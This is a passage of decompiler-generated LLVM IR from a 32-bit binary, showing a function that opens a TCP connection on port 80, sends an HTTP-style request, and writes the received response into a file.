  br label %dec_label_pc_8048a6f

dec_label_pc_8048a6f:                             ; preds = %dec_label_pc_8048a43, %dec_label_pc_8048a49
  %v4_8048a86 = call i32 @function_804dd68(i32 2, i32 1, i32 0)
  %v8_8048a8e = icmp ne i32 %v4_8048a86, -1
  store i1 %v8_8048a8e, i1* %cf.global-to-local, align 1
  %v13_8048a8e = icmp eq i32 %v4_8048a86, -1
  %v1_8048a92 = icmp eq i1 %v13_8048a8e, false
  br i1 %v1_8048a92, label %dec_label_pc_8048aba, label %dec_label_pc_8048a94

dec_label_pc_8048a94:                             ; preds = %dec_label_pc_8048a6f
  %v3_8048aa9 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_8052920.18 to i32))
  store i32 %v3_8048aa9, i32* @eax, align 4
  %v1_8048ab5 = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8048aba

dec_label_pc_8048aba:                             ; preds = %dec_label_pc_8048a6f, %dec_label_pc_8048a94
  %v1_8048abd = add i32 %arg4, 4
  %v5_8048abd = icmp ugt i32 %arg4, -5
  store i1 %v5_8048abd, i1* %cf.global-to-local, align 1
  %v1_8048ac0 = inttoptr i32 %v1_8048abd to i32*
  %v2_8048ac0 = load i32, i32* %v1_8048ac0, align 4
  store i1 false, i1* @df, align 1
  %v4_8048add = inttoptr i32 %v2_8048ac0 to i8*
  store i32 %v2_8048ac0, i32* @esi, align 4
  %v7_8048aef = call i32 @_strncmp(i8* %v4_8048add, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8052945.19, i32 0, i32 0), i32 7)
  %v8_8048aef = urem i32 %v7_8048aef, 2
  %v9_8048aef = icmp eq i32 %v8_8048aef, 0
  %v0_8048af1 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048af1 = or i1 %v0_8048af1, %v9_8048aef
  %v3_8048af1 = zext i1 %v2_8048af1 to i32
  %v4_8048af1 = load i32, i32* @edx, align 4
  %v5_8048af1 = and i32 %v4_8048af1, -256
  %v6_8048af1 = or i32 %v3_8048af1, %v5_8048af1
  %v7_8048af1 = xor i32 %v6_8048af1, 1
  store i32 %v7_8048af1, i32* %edx.global-to-local, align 4
  %v1_8048af9 = trunc i32 %v7_8048af1 to i8
  %v3_8048af9 = zext i1 %v0_8048af1 to i8
  %v15_8048af9 = icmp eq i8 %v1_8048af9, %v3_8048af9
  %v1_8048b02 = icmp eq i1 %v15_8048af9, false
  store i1 %v5_8048abd, i1* %cf.global-to-local, align 1
  %v2_8048b29 = load i32, i32* %v1_8048ac0, align 4
  br i1 %v1_8048b02, label %dec_label_pc_8048b23, label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048aba
  %v1_8048b0c = add i32 %v2_8048b29, 7
  %v5_8048b0c = icmp ugt i32 %v2_8048b29, -8
  store i1 %v5_8048b0c, i1* %cf.global-to-local, align 1
  %v2_8048b13 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048b13, i32* @eax, align 4
  %v3_8048b1c = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048b1c = call i32 @function_804d4f8(i8* %v3_8048b1c, i32 %v1_8048b0c)
  br label %dec_label_pc_8048b3d

dec_label_pc_8048b23:                             ; preds = %dec_label_pc_8048aba
  %v2_8048b2f = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048b2f, i32* @eax, align 4
  %v3_8048b38 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048b38 = call i32 @function_804d4f8(i8* %v3_8048b38, i32 %v2_8048b29)
  br label %dec_label_pc_8048b3d

dec_label_pc_8048b3d:                             ; preds = %dec_label_pc_8048b04, %dec_label_pc_8048b23
  %v4_8048b60.pre-phi = phi i8* [ %v3_8048b1c, %dec_label_pc_8048b04 ], [ %v3_8048b38, %dec_label_pc_8048b23 ]
  %v2_8048b4c.pre-phi = phi i32 [ %v2_8048b13, %dec_label_pc_8048b04 ], [ %v2_8048b2f, %dec_label_pc_8048b23 ]
  br label %dec_label_pc_8048b49

dec_label_pc_8048b46:                             ; preds = %dec_label_pc_8048b71
  %v4_8048b46 = add i32 %storemerge6, 1
  br label %dec_label_pc_8048b49

dec_label_pc_8048b49:                             ; preds = %dec_label_pc_8048b3d, %dec_label_pc_8048b46
  %storemerge6 = phi i32 [ %v4_8048b46, %dec_label_pc_8048b46 ], [ 0, %dec_label_pc_8048b3d ]
  store i32 %storemerge6, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048b4c.pre-phi, i32* @edi, align 4
  %v3_8048b66 = call i32 @_strlen(i8* %v4_8048b60.pre-phi)
  %v0_8048b6d = load i32, i32* @edx, align 4
  %v7_8048b6d = icmp ult i32 %v0_8048b6d, %v3_8048b66
  store i1 %v7_8048b6d, i1* %cf.global-to-local, align 1
  %v1_8048b6f = icmp eq i1 %v7_8048b6d, false
  br i1 %v1_8048b6f, label %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge, label %dec_label_pc_8048b71

dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge: ; preds = %dec_label_pc_8048b49
  %v0_8048b83.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge6, -1092
  br label %dec_label_pc_8048b80

dec_label_pc_8048b71:                             ; preds = %dec_label_pc_8048b49
  %v0_8048b74 = load i32, i32* @ebp, align 4
  %v2_8048b74 = add i32 %storemerge6, -1092
  %v3_8048b74 = add i32 %v0_8048b74, %v2_8048b74
  %v4_8048b74 = inttoptr i32 %v3_8048b74 to i8*
  %v5_8048b74 = load i8, i8* %v4_8048b74, align 1
  %v6_8048b7c = icmp ult i8 %v5_8048b74, 47
  store i1 %v6_8048b7c, i1* %cf.global-to-local, align 1
  %v10_8048b7c = icmp eq i8 %v5_8048b74, 47
  %v1_8048b7e = icmp eq i1 %v10_8048b7c, false
  br i1 %v1_8048b7e, label %dec_label_pc_8048b46, label %dec_label_pc_8048b80

dec_label_pc_8048b80:                             ; preds = %dec_label_pc_8048b71, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge
  %v2_8048b83.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge ], [ %v2_8048b74, %dec_label_pc_8048b71 ]
  %v0_8048b83 = phi i32 [ %v0_8048b83.pre, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge ], [ %v0_8048b74, %dec_label_pc_8048b71 ]
  %v3_8048b83 = add i32 %v0_8048b83, %v2_8048b83.pre-phi
  %v4_8048b83 = inttoptr i32 %v3_8048b83 to i8*
  store i8 0, i8* %v4_8048b83, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v2_8048b98 = call i32 @function_804d778(i16 80)
  %v1_8048bad = call i32 @function_804d880(i32 %v2_8048b4c.pre-phi)
  %v8_8048bb5 = icmp ne i32 %v1_8048bad, -1
  store i1 %v8_8048bb5, i1* %cf.global-to-local, align 1
  %v13_8048bb5 = icmp eq i32 %v1_8048bad, -1
  %v1_8048bb9 = icmp eq i1 %v13_8048bb5, false
  br i1 %v1_8048bb9, label %dec_label_pc_8048c17, label %dec_label_pc_8048bbb

dec_label_pc_8048bbb:                             ; preds = %dec_label_pc_8048b80
  %v1_8048bc4 = call i32 @function_804d8a8(i32 %v2_8048b4c.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048bcc = icmp eq i32 %v1_8048bc4, 0
  %v1_8048bd0 = icmp eq i1 %v4_8048bcc, false
  br i1 %v1_8048bd0, label %dec_label_pc_8048bf8, label %dec_label_pc_8048bd2

dec_label_pc_8048bd2:                             ; preds = %dec_label_pc_8048bbb
  %v3_8048be7 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052950.20 to i32))
  store i32 %v3_8048be7, i32* @eax, align 4
  %v1_8048bf3 = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8048bf8

dec_label_pc_8048bf8:                             ; preds = %dec_label_pc_8048bbb, %dec_label_pc_8048bd2
  %v1_8048bfb = add i32 %v1_8048bc4, 12
  %v2_8048bfb = inttoptr i32 %v1_8048bfb to i32*
  %v3_8048bfb = load i32, i32* %v2_8048bfb, align 4
  %v1_8048c03 = add i32 %v1_8048bc4, 16
  %v2_8048c03 = inttoptr i32 %v1_8048c03 to i32*
  %v3_8048c03 = load i32, i32* %v2_8048c03, align 4
  %v1_8048c06 = inttoptr i32 %v3_8048c03 to i32*
  %v2_8048c06 = load i32, i32* %v1_8048c06, align 4
  store i32 %v2_8048c06, i32* %edx.global-to-local, align 4
  %v5_8048c0b = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048c0b, i1* %cf.global-to-local, align 1
  %v15_8048c0b = ptrtoint i32* %stack_var_-68 to i32
  %tmp66 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048c0b, i32* @edi, align 4
  %v1_8048c10 = inttoptr i32 %v2_8048c06 to i8*
  store i32 %v2_8048c06, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048c13 = call i8* @_memcpy(i8* %tmp66, i8* %v1_8048c10, i32 %v3_8048bfb)
  br label %dec_label_pc_8048c1d

dec_label_pc_8048c17:                             ; preds = %dec_label_pc_8048b80
  store i32 %v1_8048bad, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048c1d

dec_label_pc_8048c1d:                             ; preds = %dec_label_pc_8048bf8, %dec_label_pc_8048c17
  %v2_8048c1d.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048c20 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8048c20, i1* %cf.global-to-local, align 1
  %v4_8048c45 = call i32 @function_804dc64(i32 %v4_8048a86, i32 %v2_8048c1d.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c4a = icmp eq i32 %v4_8048c45, 0
  br i1 %v1_8048c4a, label %dec_label_pc_8048c74, label %dec_label_pc_8048c4e

dec_label_pc_8048c4e:                             ; preds = %dec_label_pc_8048c1d
  %v3_8048c63 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052978.21 to i32))
  store i32 %v3_8048c63, i32* @eax, align 4
  %v1_8048c6f = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8048c74

dec_label_pc_8048c74:                             ; preds = %dec_label_pc_8048c1d, %dec_label_pc_8048c4e
  %v2_8048c7f = add i32 %storemerge6, %v2_8048b4c.pre-phi
  %v7_8048c7f = icmp ult i32 %v2_8048c7f, %v2_8048b4c.pre-phi
  store i1 %v7_8048c7f, i1* %cf.global-to-local, align 1
  %v1_8048c81 = add i32 %v2_8048c7f, 1
  store i32 %v1_8048c81, i32* %edx.global-to-local, align 4
  %v3_8048ca0 = call i32 @function_80482b3(i32 %v4_8048a86, i32 ptrtoint ([276 x i8]* @global_var_80529a0.22 to i32))
  %v3_8048cba = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8052ab4.23 to i32))
  %v1_8048cc2 = add i32 %arg4, 8
  %v5_8048cc2 = icmp ugt i32 %arg4, -9
  store i1 %v5_8048cc2, i1* %cf.global-to-local, align 1
  %v1_8048cc5 = inttoptr i32 %v1_8048cc2 to i32*
  %v2_8048cc5 = load i32, i32* %v1_8048cc5, align 4
  store i32 %v2_8048cc5, i32* @eax, align 4
  %v3_8048cd2 = call i32 @function_804bbbc(i32 %v2_8048cc5, i32 ptrtoint ([3 x i8]* @global_var_8052ad0.24 to i32))
  %v2_8048cea = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048cfa96 = call i32 @function_804dcb4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp6799 = icmp slt i32 %v5_8048cfa96, 1
  br i1 %tmp6799, label %dec_label_pc_8048e22.loopexit12, label %dec_label_pc_8048d0c

dec_label_pc_8048cda.loopexit:                    ; preds = %dec_label_pc_8048e0e
  %v5_8048cfa = call i32 @function_804dcb4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v5_8048cfa, 1
  br i1 %tmp67, label %dec_label_pc_8048e22.loopexit12, label %dec_label_pc_8048d0c

dec_label_pc_8048d0c:                             ; preds = %dec_label_pc_8048c74, %dec_label_pc_8048cda.loopexit
  %v5_8048cfa100 = phi i32 [ %v5_8048cfa, %dec_label_pc_8048cda.loopexit ], [ %v5_8048cfa96, %dec_label_pc_8048c74 ]
  %v4_8048d0c = add i32 %v5_8048cfa100, -4095
  %v8_8048d0c = icmp ult i32 %v5_8048cfa100, 4095
  %v9_8048d0c = sub i32 4094, %v5_8048cfa100
  %v10_8048d0c = and i32 %v9_8048d0c, %v5_8048cfa100
  %v11_8048d0c = icmp slt i32 %v10_8048d0c, 0
  store i1 %v8_8048d0c, i1* %cf.global-to-local, align 1
  %v12_8048d0c = icmp eq i32 %v4_8048d0c, 0
  %v13_8048d0c = icmp slt i32 %v4_8048d0c, 0
  %v3_8048d13 = icmp eq i1 %v13_8048d0c, %v11_8048d0c
  %v4_8048d13 = icmp eq i1 %v12_8048d0c, false
  %v5_8048d13 = and i1 %v4_8048d13, %v3_8048d13
  br i1 %v5_8048d13, label %dec_label_pc_8048d2c.lr.ph, label %dec_label_pc_8048d15

dec_label_pc_8048d15:                             ; preds = %dec_label_pc_8048d0c
  %v0_8048d18 = load i32, i32* @ebp, align 4
  %v2_8048d18 = add i32 %v5_8048cfa100, -5188
  %v3_8048d18 = add i32 %v2_8048d18, %v0_8048d18
  %v4_8048d18 = inttoptr i32 %v3_8048d18 to i8*
  store i8 0, i8* %v4_8048d18, align 1
  br label %dec_label_pc_8048d2c.lr.ph

dec_label_pc_8048d2c.lr.ph:                       ; preds = %dec_label_pc_8048d15, %dec_label_pc_8048d0c
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d2c

dec_label_pc_8048d2c:                             ; preds = %dec_label_pc_8048d2c.lr.ph, %dec_label_pc_8048e0e
  %storemerge595 = phi i32 [ 0, %dec_label_pc_8048d2c.lr.ph ], [ %v4_8048e0e, %dec_label_pc_8048e0e ]
  store i32 %storemerge595, i32* %edx.global-to-local, align 4
  %v2_8048d37 = add i32 %storemerge595, %v2_8048cea
  %v7_8048d37 = icmp ult i32 %v2_8048d37, %v2_8048cea
  store i1 %v7_8048d37, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048d54 = inttoptr i32 %v2_8048d37 to i8*
  store i32 %v2_8048d37, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8052ad3.25 to i32), i32* @edi, align 4
  %v7_8048d66 = call i32 @_strncmp(i8* %v4_8048d54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8052ad3.25, i32 0, i32 0), i32 4)
  %v8_8048d66 = urem i32 %v7_8048d66, 2
  %v9_8048d66 = icmp eq i32 %v8_8048d66, 0
  %v0_8048d68 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048d68 = or i1 %v0_8048d68, %v9_8048d66
  %v3_8048d68 = zext i1 %v2_8048d68 to i32
  %v4_8048d68 = load i32, i32* %edx.global-to-local, align 4
  %v5_8048d68 = and i32 %v4_8048d68, -256
  %v6_8048d68 = or i32 %v3_8048d68, %v5_8048d68
  %v7_8048d68 = xor i32 %v6_8048d68, 1
  store i32 %v7_8048d68, i32* %edx.global-to-local, align 4
  %v3_8048d6e = and i32 %v7_8048d66, -256
  %v1_8048d70 = trunc i32 %v7_8048d68 to i8
  %v3_8048d70 = zext i1 %v0_8048d68 to i8
  %v4_8048d70 = sub nsw i8 %v1_8048d70, %v3_8048d70
  %v15_8048d70 = icmp eq i8 %v4_8048d70, 0
  %v20_8048d70 = zext i8 %v4_8048d70 to i32
  %v23_8048d70 = or i32 %v20_8048d70, %v3_8048d6e
  store i32 %v23_8048d70, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d79 = icmp eq i1 %v15_8048d70, false
  br i1 %v1_8048d79, label %dec_label_pc_8048e0e, label %dec_label_pc_8048d7f

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048d2c
  %v4_8048d7f = add i32 %storemerge595, 4
  %v1_8048d8e = add i32 %v3_8048cd2, 52
  %v2_8048d8e = inttoptr i32 %v1_8048d8e to i32*
  %v1_8048d98 = add i32 %v3_8048cd2, 16
  %v2_8048d98 = inttoptr i32 %v1_8048d98 to i32*
  %v1_8048d9e = add i32 %v3_8048cd2, 28
  %v2_8048d9e = inttoptr i32 %v1_8048d9e to i32*
  %v10_8048e0385 = icmp ult i32 %v4_8048d7f, %v5_8048cfa100
  store i1 %v10_8048e0385, i1* %cf.global-to-local, align 1
  %v5_8048e0688 = icmp slt i32 %v4_8048d7f, %v5_8048cfa100
  br i1 %v5_8048e0688, label %dec_label_pc_8048d85, label %dec_label_pc_8048e22

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048dfd
  %storemerge10.in89 = phi i32 [ %v4_8048dfd, %dec_label_pc_8048dfd ], [ %v4_8048d7f, %dec_label_pc_8048d7f ]
  %v3_8048d8e = load i32, i32* %v2_8048d8e, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d91 = icmp eq i32 %v3_8048d8e, 0
  br i1 %v1_8048d91, label %dec_label_pc_8048de0, label %dec_label_pc_8048d95

dec_label_pc_8048d95:                             ; preds = %dec_label_pc_8048d85
  %v3_8048d98 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048d98, i32* %edx.global-to-local, align 4
  %v3_8048d9e = load i32, i32* %v2_8048d9e, align 4
  %v7_8048da1 = icmp ult i32 %v3_8048d98, %v3_8048d9e
  store i1 %v7_8048da1, i1* %cf.global-to-local, align 1
  %v1_8048da3 = icmp eq i1 %v7_8048da1, false
  br i1 %v1_8048da3, label %dec_label_pc_8048dc1, label %dec_label_pc_8048da5

dec_label_pc_8048da5:                             ; preds = %dec_label_pc_8048d95
  %v3_8048da8 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048da8, i32* %edx.global-to-local, align 4
  %v0_8048dae = load i32, i32* @ebp, align 4
  %v2_8048dae = add i32 %storemerge10.in89, -5188
  %v3_8048dae = add i32 %v2_8048dae, %v0_8048dae
  %v4_8048dae = inttoptr i32 %v3_8048dae to i8*
  %v5_8048dae = load i8, i8* %v4_8048dae, align 1
  %v3_8048db6 = inttoptr i32 %v3_8048da8 to i8*
  store i8 %v5_8048dae, i8* %v3_8048db6, align 1
  %v0_8048db8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048db8 = add i32 %v0_8048db8, 1
  store i32 %v1_8048db8, i32* %edx.global-to-local, align 4
  store i32 %v1_8048db8, i32* %v2_8048d98, align 4
  br label %dec_label_pc_8048dfd

dec_label_pc_8048dc1:                             ; preds = %dec_label_pc_8048d95
  %v0_8048dc4 = load i32, i32* @ebp, align 4
  %v2_8048dc4 = add i32 %storemerge10.in89, -5188
  %v3_8048dc4 = add i32 %v2_8048dc4, %v0_8048dc4
  %v4_8048dc4 = inttoptr i32 %v3_8048dc4 to i8*
  %v5_8048dc4 = load i8, i8* %v4_8048dc4, align 1
  %v6_8048dc4 = zext i8 %v5_8048dc4 to i32
  store i32 %v6_8048dc4, i32* @edx, align 4
  %v4_8048dd9 = call i32 @function_804d350(i8 %v5_8048dc4, i32 %v3_8048cd2)
  br label %dec_label_pc_8048dfd

dec_label_pc_8048de0:                             ; preds = %dec_label_pc_8048d85
  %v0_8048de3 = load i32, i32* @ebp, align 4
  %v2_8048de3 = add i32 %storemerge10.in89, -5188
  %v3_8048de3 = add i32 %v2_8048de3, %v0_8048de3
  %v4_8048de3 = inttoptr i32 %v3_8048de3 to i8*
  %v5_8048de3 = load i8, i8* %v4_8048de3, align 1
  %v6_8048de3 = zext i8 %v5_8048de3 to i32
  store i32 %v6_8048de3, i32* @edx, align 4
  %v4_8048df8 = call i32 @function_804cfbc(i8 %v5_8048de3, i32 %v3_8048cd2)
  br label %dec_label_pc_8048dfd

dec_label_pc_8048dfd:                             ; preds = %dec_label_pc_8048dc1, %dec_label_pc_8048da5, %dec_label_pc_8048de0
  %v4_8048dfd = add i32 %storemerge10.in89, 1
  %v10_8048e03 = icmp ult i32 %v4_8048dfd, %v5_8048cfa100
  store i1 %v10_8048e03, i1* %cf.global-to-local, align 1
  %exitcond105 = icmp eq i32 %v4_8048dfd, %v5_8048cfa100
  br i1 %exitcond105, label %dec_label_pc_8048e22, label %dec_label_pc_8048d85

dec_label_pc_8048e0e:                             ; preds = %dec_label_pc_8048d2c
  %v4_8048e0e = add nuw nsw i32 %storemerge595, 1
  %v10_8048e14 = icmp ult i32 %v4_8048e0e, %v5_8048cfa100
  store i1 %v10_8048e14, i1* %cf.global-to-local, align 1
  %v5_8048e17 = icmp slt i32 %v4_8048e0e, %v5_8048cfa100
  br i1 %v5_8048e17, label %dec_label_pc_8048d2c, label %dec_label_pc_8048cda.loopexit

dec_label_pc_8048e22.loopexit12:                  ; preds = %dec_label_pc_8048cda.loopexit, %dec_label_pc_8048c74
  %.pre23 = add i32 %v3_8048cd2, 52
  %.pre24 = inttoptr i32 %.pre23 to i32*
  %.pre25 = add i32 %v3_8048cd2, 16
  %.pre26 = inttoptr i32 %.pre25 to i32*
  %.pre27 = add i32 %v3_8048cd2, 28
  %.pre28 = inttoptr i32 %.pre27 to i32*
  br label %dec_label_pc_8048e22

dec_label_pc_8048e22:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048dfd, %dec_label_pc_8048e22.loopexit12
  %v2_8048eb0.pre-phi = phi i32* [ %.pre28, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d9e, %dec_label_pc_8048dfd ], [ %v2_8048d9e, %dec_label_pc_8048d7f ]
  %v2_8048eaa.pre-phi = phi i32* [ %.pre26, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d98, %dec_label_pc_8048dfd ], [ %v2_8048d98, %dec_label_pc_8048d7f ]
  %v2_8048ea0.pre-phi = phi i32* [ %.pre24, %dec_label_pc_8048e22.loopexit12 ], [ %v2_8048d8e, %dec_label_pc_8048dfd ], [ %v2_8048d8e, %dec_label_pc_8048d7f ]
  store i1 %v5_8048cc2, i1* %cf.global-to-local, align 1
  %v3_8048e43 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052ad8.26 to i32))
  %v5_8048e6879 = call i32 @function_804dcb4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp6882 = icmp slt i32 %v5_8048e6879, 1
  br i1 %tmp6882, label %dec_label_pc_8048f23, label %dec_label_pc_8048e7a

dec_label_pc_8048e48.loopexit:                    ; preds = %dec_label_pc_8048f0f
  %v5_8048e68 = call i32 @function_804dcb4(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp68 = icmp slt i32 %v5_8048e68, 1
  br i1 %tmp68, label %dec_label_pc_8048f23, label %dec_label_pc_8048e7a

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048e22, %dec_label_pc_8048e48.loopexit
  %v5_8048e6883 = phi i32 [ %v5_8048e68, %dec_label_pc_8048e48.loopexit ], [ %v5_8048e6879, %dec_label_pc_8048e22 ]
  %v4_8048e7a = add i32 %v5_8048e6883, -4095
  %v8_8048e7a = icmp ult i32 %v5_8048e6883, 4095
  %v9_8048e7a = sub i32 4094, %v5_8048e6883
  %v10_8048e7a = and i32 %v9_8048e7a, %v5_8048e6883
  %v11_8048e7a = icmp slt i32 %v10_8048e7a, 0
  store i1 %v8_8048e7a, i1* %cf.global-to-local, align 1
  %v12_8048e7a = icmp eq i32 %v4_8048e7a, 0
  %v13_8048e7a = icmp slt i32 %v4_8048e7a, 0
  %v3_8048e81 = icmp eq i1 %v13_8048e7a, %v11_8048e7a
  %v4_8048e81 = icmp eq i1 %v12_8048e7a, false
  %v5_8048e81 = and i1 %v4_8048e81, %v3_8048e81
  br i1 %v5_8048e81, label %dec_label_pc_8048e97.lr.ph, label %dec_label_pc_8048e83

dec_label_pc_8048e83:                             ; preds = %dec_label_pc_8048e7a
  %v0_8048e86 = load i32, i32* @ebp, align 4
  %v2_8048e86 = add i32 %v5_8048e6883, -5188
  %v3_8048e86 = add i32 %v2_8048e86, %v0_8048e86
  %v4_8048e86 = inttoptr i32 %v3_8048e86 to i8*
  store i8 0, i8* %v4_8048e86, align 1
  br label %dec_label_pc_8048e97.lr.ph

dec_label_pc_8048e97.lr.ph:                       ; preds = %dec_label_pc_8048e83, %dec_label_pc_8048e7a
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048e97

dec_label_pc_8048e97:                             ; preds = %dec_label_pc_8048f0f, %dec_label_pc_8048e97.lr.ph
  %storemerge78 = phi i32 [ 0, %dec_label_pc_8048e97.lr.ph ], [ %v4_8048f0f, %dec_label_pc_8048f0f ]
  %v3_8048ea0 = load i32, i32* %v2_8048ea0.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048ea3 = icmp eq i32 %v3_8048ea0, 0
  br i1 %v1_8048ea3, label %dec_label_pc_8048ef2, label %dec_label_pc_8048ea7

dec_label_pc_8048ea7:                             ; preds = %dec_label_pc_8048e97
  %v3_8048eaa = load i32, i32* %v2_8048eaa.pre-phi, align 4
  store i32 %v3_8048eaa, i32* %edx.global-to-local, align 4
  %v3_8048eb0 = load i32, i32* %v2_8048eb0.pre-phi, align 4
  %v7_8048eb3 = icmp ult i32 %v3_8048eaa, %v3_8048eb0
  store i1 %v7_8048eb3, i1* %cf.global-to-local, align 1
  %v1_8048eb5 = icmp eq i1 %v7_8048eb3, false
  br i1 %v1_8048eb5, label %dec_label_pc_8048ed3, label %dec_label_pc_8048eb7

dec_label_pc_8048eb7:                             ; preds = %dec_label_pc_8048ea7
  %v3_8048eba = load i32, i32* %v2_8048eaa.pre-phi, align 4
  store i32 %v3_8048eba, i32* %edx.global-to-local, align 4
  %v0_8048ec0 = load i32, i32* @ebp, align 4
  %v2_8048ec0 = add nsw i32 %storemerge78, -5188
  %v3_8048ec0 = add i32 %v2_8048ec0, %v0_8048ec0
  %v4_8048ec0 = inttoptr i32 %v3_8048ec0 to i8*
  %v5_8048ec0 = load i8, i8* %v4_8048ec0, align 1
  %v3_8048ec8 = inttoptr i32 %v3_8048eba to i8*
  store i8 %v5_8048ec0, i8* %v3_8048ec8, align 1
  %v0_8048eca = load i32, i32* %edx.global-to-local, align 4
  %v1_8048eca = add i32 %v0_8048eca, 1
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  store i32 %v1_8048eca, i32* %v2_8048eaa.pre-phi, align 4
  br label %dec_label_pc_8048f0f

dec_label_pc_8048ed3:                             ; preds = %dec_label_pc_8048ea7
  %v0_8048ed6 = load i32, i32* @ebp, align 4
  %v2_8048ed6 = add nsw i32 %storemerge78, -5188
  %v3_8048ed6 = add i32 %v2_8048ed6, %v0_8048ed6
  %v4_8048ed6 = inttoptr i32 %v3_8048ed6 to i8*
  %v5_8048ed6 = load i8, i8* %v4_8048ed6, align 1
  %v6_8048ed6 = zext i8 %v5_8048ed6 to i32
  store i32 %v6_8048ed6, i32* @edx, align 4
  %v4_8048eeb = call i32 @function_804d350(i8 %v5_8048ed6, i32 %v3_8048cd2)
  br label %dec_label_pc_8048f0f

dec_label_pc_8048ef2:                             ; preds = %dec_label_pc_8048e97
  %v0_8048ef5 = load i32, i32* @ebp, align 4
  %v2_8048ef5 = add nsw i32 %storemerge78, -5188
  %v3_8048ef5 = add i32 %v2_8048ef5, %v0_8048ef5
  %v4_8048ef5 = inttoptr i32 %v3_8048ef5 to i8*
  %v5_8048ef5 = load i8, i8* %v4_8048ef5, align 1
  %v6_8048ef5 = zext i8 %v5_8048ef5 to i32
  store i32 %v6_8048ef5, i32* @edx, align 4
  %v4_8048f0a = call i32 @function_804cfbc(i8 %v5_8048ef5, i32 %v3_8048cd2)
  br label %dec_label_pc_8048f0f

dec_label_pc_8048f0f:                             ; preds = %dec_label_pc_8048ed3, %dec_label_pc_8048eb7, %dec_label_pc_8048ef2
  %v4_8048f0f = add nuw nsw i32 %storemerge78, 1
  %v10_8048f15 = icmp ult i32 %v4_8048f0f, %v5_8048e6883
  store i1 %v10_8048f15, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048f0f, %v5_8048e6883
  br i1 %exitcond, label %dec_label_pc_8048e48.loopexit, label %dec_label_pc_8048e97

dec_label_pc_8048f23:                             ; preds = %dec_label_pc_8048e48.loopexit, %dec_label_pc_8048e22
  store i32 %v3_8048cd2, i32* @eax, align 4
  %v1_8048f29 = inttoptr i32 %v3_8048cd2 to i16*
  %v2_8048f29 = call i32 @function_804baac(i16* %v1_8048f29)
  %v1_8048f34 = call i32 @function_804b7d8(i32 %v4_8048a86)
  store i32 %v1_8048f34, i32* @eax, align 4
  %v1_8048f40 = call i32 @function_804f274(i32 0)
  br label %dec_label_pc_8048f45

dec_label_pc_8048f45:                             ; preds = %dec_label_pc_8048a25, %dec_label_pc_8048f23
  %v0_8048f4e = phi i32 [ %v1_8048a36, %dec_label_pc_8048a25 ], [ %v1_8048f40, %dec_label_pc_8048f23 ]
  %v0_8048f45 = load i32, i32* @esp, align 4
  %v2_8048f45 = icmp ugt i32 %v0_8048f45, -5233
  store i1 %v2_8048f45, i1* %cf.global-to-local, align 1
